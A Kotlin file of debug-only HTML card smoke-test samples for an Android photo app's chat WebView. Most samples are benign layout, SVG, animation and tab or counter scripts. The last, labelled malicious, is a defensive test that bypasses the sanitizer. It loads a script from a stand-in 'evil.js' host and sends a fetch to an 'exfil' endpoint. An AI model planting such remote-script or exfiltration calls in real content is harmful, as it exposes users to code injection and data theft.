package com.mamba.picme.features.chat

/**
 * [DEV_ONLY] HTML 卡片冒烟测试样本（`ChatViewModel` 调试指令 `/html` 注入，仅 DEBUG 构建）。
 *
 * 覆盖八类验证点：
 * 1. [STATIC]：纯 HTML/CSS 排版卡片；
 * 2. [RICH_MEDIA]：图文混排（内联 SVG 插图 + 首字下沉 + 双栏正文）——渲染层断网，
 *    图片只能内联（SVG/data URI），远程 img 见 [MALICIOUS]；
 * 3. [COMPLEX_LAYOUT]：复杂排版（CSS Grid 仪表盘：统计卡 / 进度条 / 表格 / 徽标）；
 * 4. [CSS_ANIMATION]：CSS 动画（旋转圆环）；
 * 5. [ANIMATED_CHART]：动画图表（CSS keyframes 柱状图生长 + JS 数字滚动 + 呼吸灯）；
 * 6. [INLINE_JS]：内联 JS 交互（点按钮计数）；
 * 7. [INTERACTIVE]：复合交互（Tab 切换 + 手风琴折叠 + 计数，全在沙盒 JS 内完成）；
 * 8. [MALICIOUS]：恶意用例（外链 img/script、跳转、fetch）——全部应被 WebView 锁死拦截
 *    （故意绕过 [HtmlCardSanitizer] 直插，专测渲染层断网/禁导航防线）。
 *
 * 注意：列表卡片高度动态适配内容（clamp [120dp, 屏高×0.66]），滚动条一律隐藏；
 * 超高内容在卡片内滚动查看，JS 交互（按钮/Tab/手风琴）在卡片内直接生效。
 */
object HtmlCardSmokeSamples {

    private const val STATIC = """
        <div style="font-family:sans-serif;padding:16px">
          <h3 style="margin:0 0 8px">HTML 卡片 ✅</h3>
          <p style="margin:0;color:#666">纯 HTML + CSS 排版渲染正常。</p>
          <div style="display:flex;gap:8px;margin-top:12px">
            <span style="background:#e3f2fd;border-radius:12px;padding:4px 12px">标签 A</span>
            <span style="background:#e8f5e9;border-radius:12px;padding:4px 12px">标签 B</span>
          </div>
        </div>
    """

    private const val RICH_MEDIA = """
        <div style="font-family:serif;padding:16px;color:#222">
          <div style="border-radius:12px;overflow:hidden;margin-bottom:12px">
            <svg viewBox="0 0 400 160" width="100%" height="160" preserveAspectRatio="xMidYMid slice">
              <defs>
                <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="0" stop-color="#ff9a56"/>
                  <stop offset="1" stop-color="#ff6b95"/>
                </linearGradient>
              </defs>
              <rect width="400" height="160" fill="url(#sky)"/>
              <circle cx="320" cy="46" r="24" fill="#fff3d6" opacity="0.9"/>
              <polygon points="0,160 90,70 180,160" fill="#5b3a6e"/>
              <polygon points="110,160 220,50 340,160" fill="#3f2a52"/>
              <polygon points="260,160 350,90 400,140 400,160" fill="#2c1d3d"/>
              <rect y="140" width="400" height="20" fill="#241731"/>
            </svg>
          </div>
          <h3 style="margin:0 0 4px;font-size:18px">日落山径 · 图文混排</h3>
          <p style="margin:0 0 10px;font-size:12px;color:#888">2026-09-25 · 内联 SVG 插图（离线可渲染）</p>
          <p style="margin:0;font-size:14px;line-height:1.7;text-align:justify">
            <span style="float:left;font-size:40px;line-height:1;padding:2px 8px 0 0;color:#e91e63;font-weight:bold">傍</span>
            晚的山脊被夕阳染成橙紫色，三座山峰的剪影层层递进。这张插图完全由
            <b>内联 SVG</b> 绘制，不请求任何网络资源——HTML 卡片渲染层处于断网沙盒中，
            所有图文必须自包含。正文采用首字下沉与两端对齐排版，验证复杂文本版式能力。
          </p>
          <div style="display:flex;gap:8px;margin-top:12px">
            <span style="background:#fce4ec;color:#c2185b;border-radius:12px;padding:3px 12px;font-size:12px">摄影</span>
            <span style="background:#ede7f6;color:#5e35b1;border-radius:12px;padding:3px 12px;font-size:12px">SVG</span>
            <span style="background:#e0f7fa;color:#00838f;border-radius:12px;padding:3px 12px;font-size:12px">离线</span>
          </div>
        </div>
    """

    private const val COMPLEX_LAYOUT = """
        <div style="font-family:sans-serif;padding:14px;background:#f5f7fa">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <b style="font-size:15px">相册数据仪表盘</b>
            <span style="background:#1a73e8;color:#fff;border-radius:10px;padding:2px 10px;font-size:11px">LIVE</span>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <div style="background:linear-gradient(135deg,#667eea,#764ba2);border-radius:10px;padding:10px;color:#fff">
              <div style="font-size:11px;opacity:.8">总照片</div>
              <div style="font-size:22px;font-weight:bold">12,847</div>
              <div style="font-size:10px;opacity:.8">▲ 本月 +326</div>
            </div>
            <div style="background:linear-gradient(135deg,#f093fb,#f5576c);border-radius:10px;padding:10px;color:#fff">
              <div style="font-size:11px;opacity:.8">已打标</div>
              <div style="font-size:22px;font-weight:bold">9,302</div>
              <div style="font-size:10px;opacity:.8">覆盖率 72.4%</div>
            </div>
            <div style="background:#fff;border-radius:10px;padding:10px;grid-column:1/3;box-shadow:0 1px 3px rgba(0,0,0,.08)">
              <div style="font-size:12px;color:#666;margin-bottom:6px">存储分布</div>
              <div style="display:flex;height:12px;border-radius:6px;overflow:hidden">
                <div style="width:55%;background:#4caf50"></div>
                <div style="width:30%;background:#2196f3"></div>
                <div style="width:15%;background:#ffc107"></div>
              </div>
              <div style="display:flex;gap:12px;font-size:10px;color:#888;margin-top:6px">
                <span>● 照片 55%</span><span>● 视频 30%</span><span>● 其他 15%</span>
              </div>
            </div>
          </div>
          <table style="width:100%;border-collapse:collapse;margin-top:10px;background:#fff;border-radius:8px;overflow:hidden;font-size:12px">
            <tr style="background:#eceff1;color:#555">
              <th style="padding:6px 8px;text-align:left">类别</th>
              <th style="padding:6px 8px;text-align:right">数量</th>
              <th style="padding:6px 8px;text-align:right">占比</th>
            </tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">人物</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">4,211</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">32.8%</td></tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">风景</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">3,056</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">23.8%</td></tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">美食</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">1,874</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">14.6%</td></tr>
          </table>
        </div>
    """

    private const val CSS_ANIMATION = """
        <div style="padding:24px;text-align:center">
          <div style="width:48px;height:48px;margin:0 auto;border-radius:50%;
               background:conic-gradient(#2196f3,#e91e63,#2196f3);
               animation:spin 2s linear infinite"></div>
          <p style="color:#666">CSS 动画（旋转圆环）</p>
          <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
        </div>
    """

    private const val ANIMATED_CHART = """
        <div style="font-family:sans-serif;padding:16px">
          <b style="font-size:14px">近 6 个月拍照趋势</b>
          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;
                margin-left:6px;animation:pulse 1.2s ease-in-out infinite"></span>
          <div style="display:flex;align-items:flex-end;gap:10px;height:120px;margin-top:14px;
               border-bottom:2px solid #ddd;padding:0 4px">
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:40%;background:linear-gradient(180deg,#42a5f5,#1e88e5);border-radius:4px 4px 0 0;animation-delay:.0s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:65%;background:linear-gradient(180deg,#66bb6a,#43a047);border-radius:4px 4px 0 0;animation-delay:.15s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:52%;background:linear-gradient(180deg,#ffa726,#fb8c00);border-radius:4px 4px 0 0;animation-delay:.3s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:88%;background:linear-gradient(180deg,#ab47bc,#8e24aa);border-radius:4px 4px 0 0;animation-delay:.45s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:70%;background:linear-gradient(180deg,#ec407a,#d81b60);border-radius:4px 4px 0 0;animation-delay:.6s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:95%;background:linear-gradient(180deg,#26c6da,#00acc1);border-radius:4px 4px 0 0;animation-delay:.75s"></div>
            </div>
          </div>
          <div style="display:flex;gap:10px;font-size:10px;color:#999;padding:4px">
            <span style="flex:1;text-align:center">4月</span><span style="flex:1;text-align:center">5月</span>
            <span style="flex:1;text-align:center">6月</span><span style="flex:1;text-align:center">7月</span>
            <span style="flex:1;text-align:center">8月</span><span style="flex:1;text-align:center">9月</span>
          </div>
          <p style="text-align:center;font-size:13px;color:#555;margin:10px 0 0">
            本月已拍 <b id="cnt" style="color:#00acc1;font-size:18px">0</b> 张
          </p>
          <style>
            @keyframes grow{from{transform:scaleY(0)}to{transform:scaleY(1)}}
            @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
            .bar{transform-origin:bottom;animation:grow .8s cubic-bezier(.2,.8,.3,1.2) both}
          </style>
          <script>
            (function(){
              var target=326,cur=0,el=document.getElementById('cnt');
              var t=setInterval(function(){
                cur+=7;if(cur>=target){cur=target;clearInterval(t);}
                el.textContent=cur;
              },30);
            })();
          </script>
        </div>
    """

    private const val INLINE_JS = """
        <div style="padding:24px;text-align:center;font-family:sans-serif">
          <button id="btn" style="font-size:16px;padding:8px 24px">点击计数：0</button>
          <p style="color:#666">内联 JS 交互（点按钮计数直接在卡片内生效）</p>
          <script>
            var n=0;
            document.getElementById('btn').onclick=function(){
              n++;this.textContent='点击计数：'+n;
            };
          </script>
        </div>
    """

    private const val INTERACTIVE = """
        <div style="font-family:sans-serif;padding:14px">
          <div style="display:flex;gap:6px;border-bottom:2px solid #eee">
            <button class="tab" data-t="0" style="flex:1;border:none;background:none;padding:8px;font-size:13px;font-weight:bold;color:#1a73e8;border-bottom:2px solid #1a73e8;margin-bottom:-2px">概览</button>
            <button class="tab" data-t="1" style="flex:1;border:none;background:none;padding:8px;font-size:13px;color:#888">人物</button>
            <button class="tab" data-t="2" style="flex:1;border:none;background:none;padding:8px;font-size:13px;color:#888">地点</button>
          </div>
          <div class="pane" style="display:block;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            📊 相册共 12,847 张照片，本月新增 326 张，打标覆盖率 72.4%。
          </div>
          <div class="pane" style="display:none;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            👨‍👩‍👧 识别出 23 位人物，最常出现：大宝（412 张）、xiaotong（388 张）。
          </div>
          <div class="pane" style="display:none;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            📍 Top 拍摄地：杭州（1,204）、上海（986）、东京（402）。
          </div>
          <div style="margin-top:8px;border:1px solid #e0e0e0;border-radius:8px;overflow:hidden">
            <button id="acc" style="width:100%;text-align:left;border:none;background:#fafafa;padding:10px;font-size:13px">
              ▶ 为什么照片数在 7 月暴涨？（点击展开）
            </button>
            <div id="accBody" style="display:none;padding:10px;font-size:12px;color:#666;line-height:1.6;border-top:1px solid #eee">
              7 月对应暑假出行高峰：相册中 7 月照片 68% 含「风景」标签，
              且地理位置聚类显示集中在西北环线。暴涨属正常季节性波动。
            </div>
          </div>
          <script>
            var tabs=document.querySelectorAll('.tab'),panes=document.querySelectorAll('.pane');
            for(var i=0;i<tabs.length;i++){
              tabs[i].onclick=function(){
                for(var j=0;j<tabs.length;j++){
                  var on=tabs[j].getAttribute('data-t')===this.getAttribute('data-t');
                  panes[j].style.display=on?'block':'none';
                  tabs[j].style.color=on?'#1a73e8':'#888';
                  tabs[j].style.fontWeight=on?'bold':'normal';
                  tabs[j].style.borderBottom=on?'2px solid #1a73e8':'none';
                }
              };
            }
            document.getElementById('acc').onclick=function(){
              var b=document.getElementById('accBody');
              var open=b.style.display!=='none';
              b.style.display=open?'none':'block';
              this.textContent=(open?'▶ ':'▼ ')+'为什么照片数在 7 月暴涨？（点击展开）';
            };
          </script>
        </div>
    """

    private const val MALICIOUS = """
        <div style="padding:16px;font-family:sans-serif">
          <p>恶意用例：以下远程资源与跳转应<b>全部失效</b></p>
          <img src="https://example.com/should-not-load.png" width="100" height="60"
               style="border:1px dashed red">
          <p><a href="https://example.com">外链跳转（点了应无反应）</a></p>
          <script src="https://example.com/evil.js"></script>
          <script>
            fetch('https://example.com/exfil').then(function(){
              document.title='LEAKED';
            }).catch(function(){});
          </script>
        </div>
    """

    val all: List<String> = listOf(
        STATIC,
        RICH_MEDIA,
        COMPLEX_LAYOUT,
        CSS_ANIMATION,
        ANIMATED_CHART,
        INLINE_JS,
        INTERACTIVE,
        MALICIOUS,
    )
}
